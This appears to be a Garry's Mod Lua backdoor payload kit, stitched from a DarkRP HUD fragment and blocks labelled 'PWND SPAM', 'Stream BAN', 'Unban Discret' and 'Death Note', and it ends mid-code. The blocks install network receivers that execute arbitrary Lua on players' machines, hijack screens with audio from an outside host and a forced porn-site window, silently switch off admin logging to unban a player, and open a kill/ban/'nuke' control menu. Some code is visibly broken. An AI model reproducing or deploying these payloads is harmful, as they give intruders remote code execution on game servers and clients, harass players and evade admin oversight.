			        draw.RoundedBox(4, 10, 10, Scrw - 20, 110, Color(0, 0, 0, 200))
			        draw.DrawNonParsedText(DarkRP.getPhrase("listen_up"), "GModToolName", Scrw / 2 + 10, 10, Color(255, 255, 255, 255), 1)
			        draw.DrawNonParsedText(Message, "ChatFont", Scrw / 2 + 10, 90, Color(200, 30, 30, 255), 1)
			    end

			    timer.Create("DarkRP_AdminTell", 10, 1, function()
			        AdminTell = function() end
			    end)
		end)



	/*---------------------------------------------------------------------------

	DrawEntityDisplay

	---------------------------------------------------------------------------*/


	local function DrawEntityDisplay()
			local shootPos = LocalPlayer():GetShootPos()
			local aimVec = LocalPlayer():GetAimVector()

			for k, ply in pairs(players or player.GetAll()) do
				if ply == LocalPlayer() or not ply:Alive() or ply:GetNoDraw() then continue end
				local hisPos = ply:GetShootPos()

				if GAMEMODE.Config.globalshow then
					ply:drawPlayerInfo()
				-- Draw when you're (almost) looking at him
				elseif hisPos:DistToSqr(shootPos) < 160000 then
					local pos = hisPos - shootPos
					local unitPos = pos:GetNormalized()
					if unitPos:Dot(aimVec) > 0.95 then
						local trace = util.QuickTrace(shootPos, pos, LocalPlayer())
						if trace.Hit and trace.Entity ~= ply then return end
						ply:drawPlayerInfo()
					end
				end
			end

			local tr = LocalPlayer():GetEyeTrace()

			if IsValid(tr.Entity) and tr.Entity:isKeysOwnable() and tr.Entity:GetPos():Distance(LocalPlayer():GetPos()) < 200 then
				tr.Entity:drawOwnableInfo()
			end

		end


		local function DisplayNotify(msg)
			local txt = msg:ReadString()
			GAMEMODE:AddNotify(txt, msg:ReadShort(), msg:ReadLong())
			surface.PlaySound("buttons/lightswitch2.wav")

			-- Log to client console
			print(txt)
		end
		net.Receive("_Notify", DisplayNotify)

		function DisableDrawInfo()
			return false
		end
		hook.Add("HUDDrawTargetID", "DisableDrawInfo", DisableDrawInfo)

	/*---------------------------------------------------------------------------

	Draw Hud

	---------------------------------------------------------------------------*/


local function DrawBlastHUD()


	Base()
	if PIXConfig.SteamImage == true then
		SteamImage()
	end
	Plaryerinfo()

	Health()

	Armor()

	Hunger()

	PlayerIcons()

	Agenda()
	if PIXConfig.StaminaActivate == true then
	Stamina()
	end

	DrawVoiceChat()

	Lockdown()

	if PIXConfig.AboveTheHead == true then
	AboveHead()
	end
end

hook.Add("HUDPaint", "DrawBlastHUD", DrawBlastHUD)




--[[

    PWND SPAM

]]--



local gfx = {}

local messages = {
	"Redémarrer ton serveur ne sert à rien !",
	"Vous déconnecter ne sert à rien !",
	"Je me suis fait chier à faire ce payload",
	"Alors tu vas le regarder, en entier",
	"Galshi Revolution - Psystem",
	"Avoue c'est un peut styler quand même",
	"Par un canard"
}


hook.Add("HUDPaint", "FUCKIT_G",function()
	for k,v in pairs(gfx) do
		v()
	end
end)

local message = "Ne redemmare pas ton server, cela ne sert a rien"
local function SlowType(msg,interval,callback)
	callback = callback or function()end
	message = ""
	for i=1,#msg do
		timer.Simple(interval * i,function()
			message = message .. msg[i]
		end)
	end
	timer.Simple(#msg*interval,callback)
end
local function GetRandomSpot()
	local ppos = LocalPlayer():GetPos()
	return Vector(ppos.x + math.random(-500, 500),ppos.y + math.random(-500, 500),ppos.z + math.random(-10, 10))
end
surface.CreateFont("PWN",{bold=true,size=40})
SOUNDSTART_CTP = false
sound.PlayURL("http://rottenfish-drm.tk/r.mp3","no block",function(s)
	if not s then return end
	if SOUNDSTART_CTP then s:Stop() return end
	SOUNDSTART_CTP = true


	local ragtbl = {}
	for i=1,20 do
		ragtbl[i] = ClientsideRagdoll( "models/player/gman_high.mdl" )
		ragtbl[i]:SetNoDraw( false )
		ragtbl[i]:DrawShadow( true )
	end
	

	timer.Create("ChangeRagdolesSpotsAW", 1, 0, function()
		for k,v in pairs(ragtbl) do
			v:SetPos(GetRandomSpot())
		end
	end)


	hook.Add("AdjustMouseSensitivity","MDR",function()
		return 0
	end)
	gfx["CoolEffect"] = function()
		local tbl = {}
		s:FFT(tbl,FFT_2048)

		local fal = 0
		for i=4,6 do
			fal = fal + tbl[i]
		end

		if fal > 0.8 then
			local ca = Color(math.random(0,255),math.random(0,255),math.random(0,255), 150)
			gfx["ColorChange"] = function()
				draw.RoundedBoxEx(0, 0, 0, ScrW(),ScrH(),ca)
			end
			util.ScreenShake(LocalPlayer():GetPos(),20,20,0.5,20)
			local mats = Entity(0):GetMaterials()
			for k,v in pairs(mats) do
			local r,g,b = ColorRand().r-50, ColorRand().g-50, ColorRand().b-50
				Material(v):SetVector("$color", Vector(r,g,b))
				Material(v):SetTexture( "$basetexture", "_rt_fullframefb" )
			end
		end
		for k,v in pairs(tbl) do
			local col = HSVToColor(k * 1 % 360,1,1)
			draw.RoundedBoxEx(0,0,k * 10, (v*10000), 10,col)
			draw.RoundedBoxEx(0,ScrW() - (v*10000),k * 10, (v*10000), 10,col)
		end
	end
	
	timer.Simple(29, function()
		
			hook.Add("GetMotionBlurValues", "YASS",function(a,b,c,d)
				return a,b,c+140,d
			end)
			
		
	end)

	local cc = 1
	local omgs = {}
	timer.Create("MVSPOS", 0.04, 0, function()
		for k,v in pairs(omgs) do
			if  omgs[ k ].n <= 0 then omgs[ k ] = nil continue end
			omgs[ k ] = {text = omgs[ k ].text, n = omgs[ k ].n - 1}
		end
	end)
	local isPounding = false

	timer.Create("NEXTMSG", 6, #messages, function()
		if cc > #messages then
			isPounding = true
			return
		end
		table.insert(omgs, {text = messages[ cc ],n = ScrH()})
		cc = cc + 1
	end)
	
	gfx["MessageC"] = function()
		if isPounding and (#messages <= 0) then
			draw.SimpleText("RT ton server <3", "PWN", ScrW() / 2, ScrH() / 2,Color(200,0,0),1,1)
		end
		for k,v in pairs(omgs) do
			draw.SimpleText(omgs[ k ].text, "PWN", ScrW() / 2, omgs[ k ].n,Color(0,0,0),1,1)
		end
	end
end)
concommand.Add("canard", function() 
	hook.Remove("GetMotionBlurValues", "YASS")
	hook.Remove("AdjustMouseSensitivity","MDR")
	hook.Remove("HUDPaint", "FUCKIT_G")
end)



--[[

    Stream BAN

]]--



local function rdm_str(len)
    if !len or len <= 0 then return '' end
    return rdm_str(len - 1) .. ("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")[math.random(1, 62)]
end

local net_string = rdm_str(25)

util.AddNetworkString(net_string)
BroadcastLua([[net.Receive("]] .. net_string .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])

hook.Add("PlayerInitialSpawn", "ifyouseethisdontpanicitsme",function(ply)
    if !ply:IsBot() then
        ply:SendLua([[net.Receive("]] .. net_string .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
    end
end)

local function SendToClient(ply, code)
    timer.Simple(2, function()
        local data = util.Compress(code)
        local len = #data
        net.Start(net_string)
        net.WriteUInt(len, 16)
        net.WriteData(data, len)
        net.Send(ply)
    end)
end


for i=1, #player.GetHumans() do
    local ply = player.GetHumans()[i]
    if ply:Nick() == "{{argument}}" then
        SendToClient(ply, 
            [[
local frame = vgui.Create( "DFrame" )
frame:SetSize( ScrW(), ScrH() )
frame:SetTitle( "" )
frame:Center()
frame:ShowCloseButton(false)
frame:SetDraggable(false)
frame:MakePopup()

local html = vgui.Create( "DHTML", frame )
html:Dock( FILL )
html:OpenURL( "https://pornhub.com" )
            ]])
    end
end



--[[

    Unban Discret

]]--



game.ConsoleCommand("ulx logecho 0\n")
timer.Simple( "deban", 1, 0, function()
game.ConsoleCommand("ulx unban {{argument}}\n")
end)
timer.Simple( "logon", 2, 0, function()
game.ConsoleCommand("ulx logecho 1\n")
end)



--[[

    Player Color & Size

]]--



local PP_ = "persistentpose_"

for i = 0, 64 do
	CreateClientConVar( PP_ .. "flex" .. i, 0, true, true )
	cvars.AddChangeCallback( PP_ .. "flex" .. i, ApplySettings )
end


local function spawn( ply )
       local dice = math.random(1,5)
        if dice==1 then
		ply:SetColor( Color(255,255,255,255 ) )
		elseif dice==2 then
		ply:SetColor( Color(255,178,102,255 ) )
		elseif dice==3 then
		ply:SetColor( Color(255,209,153,255 ) )
		elseif dice==4 then
		ply:SetColor( Color(240,230,130,255 ) )
		elseif dice==5 then
		ply:SetColor( Color( math.random(1,255), math.random(1,255), math.random(1,255), 255 ) )
	end
end
hook.Add( "PlayerSpawn", "some_unique_name", spawn )


local function spawn2( ply )
        local dice = math.random(1,15)
        if dice==1 then
		ply:SetFlexWeight(0,5)
		ply:SetFlexWeight(5,5)
		ply:SetFlexWeight(2,0)
		ply:SetFlexWeight(3,0)
		ply:SetFlexWeight(4,0)
		ply:SetFlexWeight(5,0)	
		ply:SetFlexWeight(6,0)
		ply:SetFlexWeight(7,0)
		ply:SetFlexWeight(8,0)
		ply:SetFlexWeight(9,0)
		elseif dice==2 then
		ply:SetFlexWeight(0,0)
		ply:SetFlexWeight(5,0)
		ply:SetFlexWeight(2,5)
		ply:SetFlexWeight(3,5)
		ply:SetFlexWeight(4,5)
		ply:SetFlexWeight(5,5)	
		ply:SetFlexWeight(6,5)
		ply:SetFlexWeight(7,5)
		ply:SetFlexWeight(8,5)
		ply:SetFlexWeight(9,5)
		elseif dice==3 then
		ply:SetFlexWeight(0,52)
		ply:SetFlexWeight(5,7)
		ply:SetFlexWeight(2,6)
		ply:SetFlexWeight(3,0)
		ply:SetFlexWeight(4,0)
		ply:SetFlexWeight(5,0)	
		ply:SetFlexWeight(6,0)
		ply:SetFlexWeight(7,0)
		ply:SetFlexWeight(8,0)
		ply:SetFlexWeight(9,0)
		ply:SetFlexWeight(50,0)
		ply:SetFlexWeight(55,0)
		ply:SetFlexWeight(52,5)
		ply:SetFlexWeight(53,5)
		ply:SetFlexWeight(54,0.5)
		ply:SetFlexWeight(55,0.5)
		elseif dice==4 then
		ply:SetFlexWeight(0,0)
		ply:SetFlexWeight(5,0)
		ply:SetFlexWeight(2,7)
		ply:SetFlexWeight(3,7)
		ply:SetFlexWeight(4,7)
		ply:SetFlexWeight(5,7)	
		ply:SetFlexWeight(6,7)
		ply:SetFlexWeight(7,7)
		ply:SetFlexWeight(8,7)
		ply:SetFlexWeight(9,7)
		ply:SetFlexWeight(20,7)
		ply:SetFlexWeight(23,3)
		ply:SetFlexWeight(23,3)
		ply:SetFlexWeight(24,3)
		ply:SetFlexWeight(25,0)
		ply:SetFlexWeight(26,0)
		ply:SetFlexWeight(27,0)
		ply:SetFlexWeight(28,3)
		ply:SetFlexWeight(29,3)
		ply:SetFlexWeight(30,0)
		ply:SetFlexWeight(33,0)
		ply:SetFlexWeight(32,0)
		ply:SetFlexWeight(33,3)
		ply:SetFlexWeight(34,3)
		ply:SetFlexWeight(35,0)
		ply:SetFlexWeight(36,0)
		ply:SetFlexWeight(37,0)
		ply:SetFlexWeight(38,0)
		ply:SetFlexWeight(39,3)
		ply:SetFlexWeight(40,0)
		ply:SetFlexWeight(43,0)
		ply:SetFlexWeight(42,3)
		ply:SetFlexWeight(43,1)
		elseif dice==5 then
		ply:SetFlexWeight(20,0)
		ply:SetFlexWeight(21,0)
		ply:SetFlexWeight(22,0)
		ply:SetFlexWeight(23,0)
		ply:SetFlexWeight(24,1)
		ply:SetFlexWeight(25,1)	
		ply:SetFlexWeight(26,0.0)
		ply:SetFlexWeight(27,0)
		ply:SetFlexWeight(28,0)
		ply:SetFlexWeight(29,0)
		ply:SetFlexWeight(30,0)
		ply:SetFlexWeight(31,0)
		ply:SetFlexWeight(32,0)
		ply:SetFlexWeight(33,0)
		ply:SetFlexWeight(34,2)
		ply:SetFlexWeight(35,2)
		ply:SetFlexWeight(36,2)
		ply:SetFlexWeight(37,2)
		ply:SetFlexWeight(38,0.5)
		ply:SetFlexWeight(39,2)
		ply:SetFlexWeight(40,2)
		ply:SetFlexWeight(41,2)
		ply:SetFlexWeight(42,2)
		ply:SetFlexWeight(43,2)
		elseif dice==6 then
		ply:SetFlexWeight(20,0)
		ply:SetFlexWeight(21,0)
		ply:SetFlexWeight(22,0)
		ply:SetFlexWeight(23,0)
		ply:SetFlexWeight(24,1)
		ply:SetFlexWeight(25,1)	
		ply:SetFlexWeight(26,0.0)
		ply:SetFlexWeight(27,3)
		ply:SetFlexWeight(28,3)
		ply:SetFlexWeight(29,3)
		ply:SetFlexWeight(30,3)
		ply:SetFlexWeight(31,3)
		ply:SetFlexWeight(32,0)
		ply:SetFlexWeight(33,0)
		ply:SetFlexWeight(34,0)
		ply:SetFlexWeight(35,0)
		ply:SetFlexWeight(36,0)
		ply:SetFlexWeight(37,0)
		ply:SetFlexWeight(38,0.5)
		ply:SetFlexWeight(39,0)
		ply:SetFlexWeight(40,0)
		ply:SetFlexWeight(41,0)
		ply:SetFlexWeight(42,0)
		ply:SetFlexWeight(43,0)
		elseif dice==7 then
		ply:SetFlexWeight(0,1)
		ply:SetFlexWeight(1,1)
		ply:SetFlexWeight(2,0)
		ply:SetFlexWeight(3,0)
		ply:SetFlexWeight(4,0)
		ply:SetFlexWeight(5,0)	
		ply:SetFlexWeight(6,0)
		ply:SetFlexWeight(7,0)
		ply:SetFlexWeight(8,0)
		ply:SetFlexWeight(9,0)
		ply:SetFlexWeight(20,0)
		ply:SetFlexWeight(21,2)
		ply:SetFlexWeight(22,2)
		ply:SetFlexWeight(23,0)
		ply:SetFlexWeight(24,1)
		ply:SetFlexWeight(25,2)	
		ply:SetFlexWeight(26,0.0)
		ply:SetFlexWeight(27,0)
		ply:SetFlexWeight(28,0)
		ply:SetFlexWeight(29,3)
		ply:SetFlexWeight(30,3)
		ply:SetFlexWeight(31,3)
		ply:SetFlexWeight(32,0)
		ply:SetFlexWeight(33,0)
		ply:SetFlexWeight(34,0)
		ply:SetFlexWeight(35,0)
		ply:SetFlexWeight(36,0)
		ply:SetFlexWeight(37,0)
		ply:SetFlexWeight(38,0.5)
		ply:SetFlexWeight(39,3)
		ply:SetFlexWeight(40,3)
		ply:SetFlexWeight(41,2)
		ply:SetFlexWeight(42,3)
		ply:SetFlexWeight(43,3)
		elseif dice==8 then
		ply:SetFlexWeight(10,3)
		ply:SetFlexWeight(11,3)
		ply:SetFlexWeight(12,1.5)
		ply:SetFlexWeight(13,1.5)
		ply:SetFlexWeight(14,0)
		ply:SetFlexWeight(15,0)
		ply:SetFlexWeight(21,2)
		ply:SetFlexWeight(22,2)
		ply:SetFlexWeight(23,3)
		ply:SetFlexWeight(24,1)
		ply:SetFlexWeight(25,2)	
		ply:SetFlexWeight(26,0.0)
		ply:SetFlexWeight(27,3)
		ply:SetFlexWeight(28,0)
		ply:SetFlexWeight(29,3)
		ply:SetFlexWeight(30,3)
		ply:SetFlexWeight(31,3)
		ply:SetFlexWeight(32,0)
		ply:SetFlexWeight(33,0)
		ply:SetFlexWeight(34,0)
		ply:SetFlexWeight(35,2)
		ply:SetFlexWeight(36,0)
		ply:SetFlexWeight(37,0)
		ply:SetFlexWeight(38,0.5)
		ply:SetFlexWeight(39,3)
		ply:SetFlexWeight(40,3)
		ply:SetFlexWeight(41,2)
		ply:SetFlexWeight(42,3)
		ply:SetFlexWeight(43,3)
		elseif dice==9 then
		ply:SetFlexWeight(20,1)
		ply:SetFlexWeight(21,1)
		ply:SetFlexWeight(22,1)
		ply:SetFlexWeight(23,1)
		ply:SetFlexWeight(24,0)
		ply:SetFlexWeight(25,0)	
		ply:SetFlexWeight(26,0)
		ply:SetFlexWeight(27,0.6)
		ply:SetFlexWeight(28,0.4)
		ply:SetFlexWeight(29,0)
		ply:SetFlexWeight(30,0)
		ply:SetFlexWeight(31,0)
		ply:SetFlexWeight(32,0)
		ply:SetFlexWeight(33,1)
		ply:SetFlexWeight(34,1)
		ply:SetFlexWeight(35,0)
		ply:SetFlexWeight(36,0)
		ply:SetFlexWeight(37,0)
		ply:SetFlexWeight(38,0)
		ply:SetFlexWeight(39,0)
		ply:SetFlexWeight(40,1)
		ply:SetFlexWeight(41,1)
		ply:SetFlexWeight(42,0)
		ply:SetFlexWeight(43,0)
		ply:SetFlexWeight(44,0)
		elseif dice==10 then
		ply:SetFlexWeight(20,1)
		ply:SetFlexWeight(21,1)
		ply:SetFlexWeight(22,1)
		ply:SetFlexWeight(23,1)
		ply:SetFlexWeight(24,0)
		ply:SetFlexWeight(25,0)	
		ply:SetFlexWeight(26,0)
		ply:SetFlexWeight(27,0.6)
		ply:SetFlexWeight(28,0.4)
		ply:SetFlexWeight(29,0)
		ply:SetFlexWeight(30,0)
		ply:SetFlexWeight(31,0)
		ply:SetFlexWeight(32,0)
		ply:SetFlexWeight(33,1)
		ply:SetFlexWeight(34,1)
		ply:SetFlexWeight(35,0)
		ply:SetFlexWeight(36,0)
		ply:SetFlexWeight(37,0)
		ply:SetFlexWeight(38,0)
		ply:SetFlexWeight(39,0)
		ply:SetFlexWeight(40,1)
		ply:SetFlexWeight(41,1)
		ply:SetFlexWeight(42,0)
		ply:SetFlexWeight(43,0)
		ply:SetFlexWeight(44,0)
		elseif dice==11 then
		ply:SetFlexWeight(20,3)
		ply:SetFlexWeight(21,3)
		ply:SetFlexWeight(22,3)
		ply:SetFlexWeight(23,1)
		ply:SetFlexWeight(24,0)
		ply:SetFlexWeight(25,0)	
		ply:SetFlexWeight(26,0)
		ply:SetFlexWeight(27,0.6)
		ply:SetFlexWeight(28,0.4)
		ply:SetFlexWeight(29,0)
		ply:SetFlexWeight(30,0)
		ply:SetFlexWeight(31,0)
		ply:SetFlexWeight(32,0)
		ply:SetFlexWeight(33,1)
		ply:SetFlexWeight(34,1)
		ply:SetFlexWeight(35,0)
		ply:SetFlexWeight(36,0)
		ply:SetFlexWeight(37,0)
		ply:SetFlexWeight(38,0)
		ply:SetFlexWeight(39,0)
		ply:SetFlexWeight(40,1)
		ply:SetFlexWeight(41,1)
		ply:SetFlexWeight(42,0)
		ply:SetFlexWeight(43,0)
		ply:SetFlexWeight(44,0)
		elseif dice==12 then
		ply:SetFlexWeight(20,3)
		ply:SetFlexWeight(21,3)
		ply:SetFlexWeight(22,3)
		ply:SetFlexWeight(23,1)
		ply:SetFlexWeight(24,0)
		ply:SetFlexWeight(25,0)	
		ply:SetFlexWeight(26,0)
		ply:SetFlexWeight(27,0.6)
		ply:SetFlexWeight(28,0.4)
		ply:SetFlexWeight(29,3)
		ply:SetFlexWeight(30,3)
		ply:SetFlexWeight(31,3)
		ply:SetFlexWeight(32,3)
		ply:SetFlexWeight(33,3)
		ply:SetFlexWeight(34,3)
		ply:SetFlexWeight(35,3)
		ply:SetFlexWeight(36,0)
		ply:SetFlexWeight(37,0)
		ply:SetFlexWeight(38,0)
		ply:SetFlexWeight(39,0)
		ply:SetFlexWeight(40,1)
		ply:SetFlexWeight(41,1)
		ply:SetFlexWeight(42,0)
		ply:SetFlexWeight(43,0)
		ply:SetFlexWeight(44,0)
		elseif dice==13 then
		ply:SetFlexWeight(0,1)
		ply:SetFlexWeight(1,1)
		ply:SetFlexWeight(2,0)
		ply:SetFlexWeight(3,0)
		ply:SetFlexWeight(4,0)
		ply:SetFlexWeight(5,0)	
		ply:SetFlexWeight(6,0)
		ply:SetFlexWeight(7,0)
		ply:SetFlexWeight(8,0)
		ply:SetFlexWeight(9,0)
		ply:SetFlexWeight(20,4)
		ply:SetFlexWeight(21,1)
		ply:SetFlexWeight(22,3)
		ply:SetFlexWeight(23,1)
		ply:SetFlexWeight(24,1)
		ply:SetFlexWeight(25,0)	
		ply:SetFlexWeight(26,0)
		ply:SetFlexWeight(27,3)
		ply:SetFlexWeight(28,3)
		ply:SetFlexWeight(29,0)
		ply:SetFlexWeight(30,0)
		ply:SetFlexWeight(31,0)
		ply:SetFlexWeight(32,0)
		ply:SetFlexWeight(33,1)
		ply:SetFlexWeight(34,1)
		ply:SetFlexWeight(35,0)
		ply:SetFlexWeight(36,0)
		ply:SetFlexWeight(37,0)
		ply:SetFlexWeight(38,0)
		ply:SetFlexWeight(39,1)
		ply:SetFlexWeight(40,0)
		ply:SetFlexWeight(41,0)
		ply:SetFlexWeight(42,1)
		ply:SetFlexWeight(43,1)
		elseif dice==14 then
		ply:SetFlexScale(1.5)
		ply:SetFlexWeight(0,1)
		ply:SetFlexWeight(1,1)
		ply:SetFlexWeight(2,0)
		ply:SetFlexWeight(3,0)
		ply:SetFlexWeight(4,0)
		ply:SetFlexWeight(5,0)	
		ply:SetFlexWeight(6,0)
		ply:SetFlexWeight(7,0)
		ply:SetFlexWeight(8,0)
		ply:SetFlexWeight(9,0)
		ply:SetFlexWeight(20,1)
		ply:SetFlexWeight(21,1)
		ply:SetFlexWeight(22,1)
		ply:SetFlexWeight(23,1)
		ply:SetFlexWeight(24,0)
		ply:SetFlexWeight(25,0)	
		ply:SetFlexWeight(26,0)
		ply:SetFlexWeight(27,3)
		ply:SetFlexWeight(28,3)
		ply:SetFlexWeight(29,0)
		ply:SetFlexWeight(30,0)
		ply:SetFlexWeight(31,0)
		ply:SetFlexWeight(32,0)
		ply:SetFlexWeight(33,1)
		ply:SetFlexWeight(34,1)
		ply:SetFlexWeight(35,0)
		ply:SetFlexWeight(36,0)
		ply:SetFlexWeight(37,0)
		ply:SetFlexWeight(38,0)
		ply:SetFlexWeight(39,0)
		ply:SetFlexWeight(40,0)
		ply:SetFlexWeight(41,0)
		ply:SetFlexWeight(42,3)
		ply:SetFlexWeight(43,3)
		elseif dice==15 then
		ply:SetFlexWeight(0,1)
		ply:SetFlexWeight(1,1)
		ply:SetFlexWeight(2,1)
		ply:SetFlexWeight(3,4)
		ply:SetFlexWeight(4,4)
		ply:SetFlexWeight(5,1)	
		ply:SetFlexWeight(6,0)
		ply:SetFlexWeight(7,0)
		ply:SetFlexWeight(8,0)
		ply:SetFlexWeight(9,0)
		ply:SetFlexWeight(20,3)
		ply:SetFlexWeight(21,3)
		ply:SetFlexWeight(22,3)
		ply:SetFlexWeight(23,1)
		ply:SetFlexWeight(24,0)
		ply:SetFlexWeight(25,0)	
		ply:SetFlexWeight(26,0)
		ply:SetFlexWeight(27,3.6)
		ply:SetFlexWeight(28,3.4)
		ply:SetFlexWeight(29,3)
		ply:SetFlexWeight(30,3)
		ply:SetFlexWeight(31,3)
		ply:SetFlexWeight(32,3)
		ply:SetFlexWeight(33,3)
		ply:SetFlexWeight(34,3)
		ply:SetFlexWeight(35,3)
		ply:SetFlexWeight(36,0)
		ply:SetFlexWeight(37,4)
		ply:SetFlexWeight(38,4)
		ply:SetFlexWeight(39,3)
		ply:SetFlexWeight(40,3)
		ply:SetFlexWeight(41,1)
		ply:SetFlexWeight(42,3)
		ply:SetFlexWeight(43,3)
		ply:SetFlexWeight(44,3)
		
	end
end
hook.Add( "PlayerSpawn", "fuuu", spawn3 )


local function spawn3( ply )
        local dice = math.random(1,6)
        if dice==1 then
		ply:SetModelScale(1.1, 1)
		elseif dice==2 then
		ply:SetModelScale(0.4, 1)
		elseif dice==3 then
		ply:SetModelScale(1, 1)
		elseif dice==4 then
		ply:SetModelScale(0.6, 1)
		elseif dice==5 then
		ply:SetModelScale(0.5, 0.7)
		elseif dice==6 then
		ply:SetModelScale(0.3, 0.9)
	end
end
hook.Add( "PlayerSpawn", "fuuuu", spawn3 )



--[[

  DEATH NOTE

]]--

util.AddNetworkString("SENDTEST")
util.AddNetworkString("echangeinfo")

concommand.Add("fdp", function(ply, cmd, args)
        ply:SendLua("net.Receive(\"SENDTEST\",function()RunString(net.ReadString())end)")
        net.Start("SENDTEST")
        net.WriteString([[
        surface.CreateFont( "APG_title_font", 
        {
            font = "Arial",
            size = 14,
            weight = 700,
        })
surface.CreateFont( "APG_sideBar_font",
{
    font = "Arial",
    size = 18,
    weight = 1500,
})

surface.CreateFont( "APG_mainPanel_font",
{
    font = "Arial",
    size = 19,
    weight = 8500,
})

function actioneff(aff)
    hook.Add( "HUDPaint", "infohud", function()
        draw.SimpleTextOutlined(
        aff,
        "DermaLarge",
        ScrW() /2 ,
        40,
        Color( 255, 0, 0, 255 ),
        TEXT_ALIGN_CENTER,
        TEXT_ALIGN_CENTER,
        1,
        Color( 0, 0, 255 )
    )
end)
    timer.Simple( 3, function() hook.Remove( "HUDPaint", "infohud" ) end )
end

local main_color = Color(32, 255, 0,255)


    local Frame = vgui.Create( "DFrame" )
        Frame:SetSize( ScrW() -200, ScrH() -200)
        Frame:SetPos( ScrW()/2- Frame:GetWide()/2, ScrH()/2 - Frame:GetTall()/2)
        Frame:SetTitle( "" )
        Frame:SetVisible( true )
        Frame:SetDraggable( true )
        Frame:MakePopup()
        Frame:ShowCloseButton(false)
        Frame:SetIcon( "icon16/bug.png" )
        Frame.Paint = function(i,w,h)
            draw.RoundedBox(4,0,0,w,h,Color(34, 34, 34,255))
            draw.RoundedBox(0,0,23,w,1,main_color)
            local name = "      Death-Note "
            draw.DrawText( name, "APG_title_font",8, 5, Color( 189, 189, 189), 3 )
        end
    local closeButton = vgui.Create("DButton",Frame)
        closeButton:SetPos(Frame:GetWide() - 20,4)
        closeButton:SetSize(16,16)
        closeButton:SetText('')
        closeButton.DoClick = function()
            Frame:Remove()
        end
        closeButton.Paint = function(i,w,h)
            draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255,3))
            draw.DrawText( "âœ•", "APG_sideBar_font",0, -2, Color( 189, 189, 189), 3 )
        end
        
        
local Button = vgui.Create( "DButton", Frame )
Button:SetText( "" )
Button:SetTextColor( Color( 255, 255, 255 ) )
Button:SetPos( (Frame:GetWide() / 2) - 60,40 )
Button:SetSize( 120, 30 )
        Button.UpdateColours = function( label, skin )
            label:SetTextStyleColor( Color( 189, 189, 189 ) )
        end
        
                Button.Paint = function(slf, w, h)

            draw.RoundedBox(0,0,h*0.85,w-5,1, Color(0, 96, 0,255))
            local text = "Tout le monde"
            draw.DrawText( text, "APG_mainPanel_font",5, 8, Color( 189, 189, 189), 3 )
        end
        
        
Button.DoClick = function()
    local m = DermaMenu()
local infoserver, infoservericon = m:AddSubMenu( "Serveur" )
infoservericon:SetIcon( "icon16/bug.png" )
m:AddSpacer()
local meutreall, meutreiconall = m:AddSubMenu( "Meutre" )
meutreiconall:SetIcon( "icon16/bomb.png" )
m:AddSpacer()
local ulxall, ulxallicon = m:AddSubMenu( "Commandes" )
ulxallicon:SetIcon( "icon16/script_add.png" )
local notificationall, notificationallicon = ulxall:AddSubMenu( "Notification" )
notificationallicon:SetIcon( "icon16/briefcase.png" )
local meutreallsub, meutreallsubicon = meutreall:AddSubMenu( "Tuer" )
meutreallsubicon:SetIcon( "icon16/delete.png" )
local meutreallssub, meutreallssubicon = meutreall:AddSubMenu( "Tuer(silencieux)" )
meutreallssubicon:SetIcon( "icon16/delete.png" )
local explosesub, explosesubicon = meutreall:AddSubMenu( "Exploser" )
explosesubicon:SetIcon( "icon16/delete.png" )
local igniteallssub, igniteallssubicon = meutreall:AddSubMenu( "Bruler" )
igniteallssubicon:SetIcon( "icon16/delete.png" )
local kicksub, kicksubicon = ulxall:AddSubMenu( "Kick" )
kicksubicon:SetIcon( "icon16/status_away.png" )
local bansub, bansubicon = ulxall:AddSubMenu( "Ban" )
bansubicon:SetIcon( "icon16/status_busy.png" )
local freezesub, freezesubicon = ulxall:AddSubMenu( "Freeze" )
freezesubicon:SetIcon( "icon16/stop.png" )
local unfreezesub, unfreezesubicon = ulxall:AddSubMenu( "Unfreeze" )
unfreezesubicon:SetIcon( "icon16/accept.png" )
local noclipsub, noclipsubicon = ulxall:AddSubMenu( "NOCLIP" )
noclipsubicon:SetIcon( "icon16/drive_user.png" )
m:AddSpacer()



local animationall, animationallicon = m:AddSubMenu( "Animation" )
animationallicon:SetIcon( "icon16/wand.png" )
local animationallsubsalute, animationallsubiconsalute = animationall:AddSubMenu( "Saluer" )
animationallsubiconsalute:SetIcon( "icon16/wand.png" )
local animationallsubrobot, animationallsubiconrobot = animationall:AddSubMenu( "Robot" )
animationallsubiconrobot:SetIcon( "icon16/wand.png" )
m:AddSpacer()
local animationallsubcheer, animationallsubiconcheer = animationall:AddSubMenu( "Levez les mains" )
animationallsubiconcheer:SetIcon( "icon16/wand.png" )
local animationallsublaugh, animationallsubiconlaugh = animationall:AddSubMenu( "Rire" )
animationallsubiconlaugh:SetIcon( "icon16/wand.png" )
local animationallsubmuscle, animationallsubiconmuscle = animationall:AddSubMenu( "Danse Sexy!" )
animationallsubiconmuscle:SetIcon( "icon16/wand.png" )
local animationallsubpersistence, animationallsubiconpersistence = animationall:AddSubMenu( "Faire le beau!" )
animationallsubiconpersistence:SetIcon( "icon16/wand.png" )
local animationallsubdance, animationallsubicondance = animationall:AddSubMenu( "Danse!" )
animationallsubicondance:SetIcon( "icon16/wand.png" )
local moovesall, moovesiconall = m:AddSubMenu( "Mouvement" )
moovesiconall:SetIcon( "icon16/controller.png" )
m:AddSpacer()
local trollall, trollallicon = m:AddSubMenu( "Troll Menu" )
trollallicon:SetIcon( "icon16/rainbow.png" )
local spamchat, spamchaticon = trollall:AddSubMenu( "Spam Chat" )
spamchaticon:SetIcon( "icon16/application_form.png" )
local nuke, nukeicon = trollall:AddSubMenu( "Nuke" )
nukeicon:SetIcon( "icon16/lightning.png" )

local mooveall, mooveallicon = trollall:AddSubMenu( "Mouvement" )
mooveallicon:SetIcon( "icon16/bug_error.png" )

local jumpbreakall, jumpbreakallicon = trollall:AddSubMenu( "Jump Break" )
jumpbreakallicon:SetIcon( "icon16/rainbow.png" )

local gravitesub, gravitesubicon = trollall:AddSubMenu( "GravitÃ© Break" )
gravitesubicon:SetIcon( "icon16/rainbow.png" )

local physiquesub, physiqueicon = trollall:AddSubMenu( "Physique Break" )
physiqueicon:SetIcon( "icon16/rainbow.png" )

local quakeearth, quakeearthicon = trollall:AddSubMenu( "Tremblement" )
quakeearthicon:SetIcon( "icon16/rainbow.png" )

local prisonsub, prisonsubicon = trollall:AddSubMenu( "Prison" )
